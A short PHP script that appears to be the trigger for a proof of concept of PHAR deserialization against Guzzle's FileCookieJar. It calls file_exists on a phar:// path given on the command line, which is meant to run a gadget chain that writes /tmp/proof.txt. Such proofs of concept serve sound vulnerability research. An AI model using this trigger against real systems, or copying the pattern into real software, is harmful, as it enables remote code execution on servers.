<?php

require __DIR__.'/vendor/autoload.php';

use GuzzleHttp\Cookie\FileCookieJar;
use GuzzleHttp\Cookie\SetCookie;


if($argc < 2) die("Syntaxe : test.php <phar_file>");

$poc = $argv[1];

@unlink('/tmp/proof.txt');

// use this to execute poc
if(!file_exists('phar://'.$poc)) echo "ERROR : file not found\n";
else echo 'You should see a file /tmp/proof.txt'."\n";

